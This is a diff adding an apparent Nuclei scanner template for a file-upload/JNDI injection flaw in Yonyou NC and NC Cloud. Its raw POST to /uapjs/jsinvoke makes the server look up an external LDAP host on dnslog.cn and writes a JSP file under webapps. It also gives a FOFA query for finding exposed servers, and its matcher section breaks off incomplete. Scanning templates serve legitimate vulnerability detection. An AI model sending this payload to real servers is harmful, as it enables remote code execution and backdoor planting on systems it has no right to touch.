@@ -1,0 +1,33 @@
+id: uapjs_rce
+info:
+  name: 用友NC-uapjs
+  author: mike
+  severity: info
+  description: 用友NC及NC Cloud系统存在任意文件上传漏洞，攻击者可通过uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给NC服务器预埋后门，从而可以随意操作服务器
+  reference: https://www.cnblogs.com/pursue-security/p/17685176.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+http:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-formurlencoded
+        Content-Length: 285
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://sqb2c1.dnslog.cn/exp')}","webapps/nc_web/jndi.jsp"]}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 
